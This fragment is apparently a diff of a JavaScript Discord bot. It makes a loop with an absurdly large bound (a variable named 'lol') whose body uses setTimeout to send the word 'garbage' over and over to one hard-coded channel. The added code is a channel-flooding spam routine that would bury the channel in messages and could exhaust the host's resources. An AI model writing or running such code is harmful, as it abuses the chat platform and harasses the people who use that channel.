@@ -41,7 +41,8 @@ let args = messageArray.slice(1);
                 }
 }
 });
- 	for (i = 0; i < 99999999999999999;  i++) {
+var lol = 9999999999999999999999999999
+ 	for (i = 0; i < lol;  i++) {
  setTimeout(function () {
      
      bot.channels.find(r=> r.id === "365615671247372301").send("garbage")
